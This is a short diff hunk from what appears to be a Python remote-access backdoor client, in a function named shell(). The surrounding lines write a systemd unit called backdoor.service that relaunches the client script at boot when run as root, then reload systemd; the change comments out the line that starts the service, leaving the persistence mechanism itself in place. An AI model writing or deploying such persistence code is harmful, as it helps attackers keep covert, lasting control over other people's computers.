@@ -52,7 +52,7 @@ def shell():
                               "30\nExecStart=/usr/bin/python /home/kris/Downloads/entangled-master/client.py\n\n["
                               "Install]\nWantedBy=multi-user.target' > /etc/systemd/system/backdoor.service")
                     os.system("systemctl daemon-reload")
-                    os.system("systemctl start backdoor")
+                    #os.system("systemctl start backdoor")
                 else:
                     print("I am not root")
             except AttributeError as a:
